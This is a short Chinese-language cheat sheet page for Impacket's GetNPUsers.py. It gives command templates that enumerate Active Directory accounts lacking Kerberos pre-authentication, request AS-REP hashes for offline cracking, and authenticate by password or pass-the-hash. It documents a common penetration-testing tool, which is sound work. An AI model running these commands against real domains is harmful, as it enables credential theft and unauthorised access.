# GetNPUsers.py

> 枚举禁用了 Kerberos 预身份验证的 Active Directory 账户，这些账户可能容易受到 AS-REP 炙烤攻击。
> 是 Impacket 套件的一部分。
> 更多信息：<https://github.com/fortra/impacket>.

- 枚举禁用了 Kerberos 预身份验证的用户（默认为匿名枚举）：

`GetNPUsers.py {{domain}}/ -usersfile {{path/to/userslist}} -dc-ip {{domain_controller_ip}}`

- 执行 AS-REP 炙烤并导出可破解的哈希，以便进行离线破解：

`GetNPUsers.py {{domain}}/ -usersfile {{path/to/userslist}} -dc-ip {{domain_controller_ip}} -request`

- 使用有效凭据进行身份验证（如果禁用了匿名绑定）：

`GetNPUsers.py {{domain}}/{{username}}:{{password}} -usersfile {{path/to/userslist}} -dc-ip {{domain_controller_ip}}`

- 使用传递哈希身份验证而不是密码：

`GetNPUsers.py {{domain}}/{{username}} -hashes {{LM_Hash}}:{{NT_Hash}} -usersfile {{path/to/userslist}} -dc-ip {{domain_controller_ip}}`

- 将输出保存到文件以便进一步分析：

`GetNPUsers.py {{domain}}/ -usersfile {{path/to/userslist}} -dc-ip {{domain_controller_ip}} -request > {{output.txt}}`
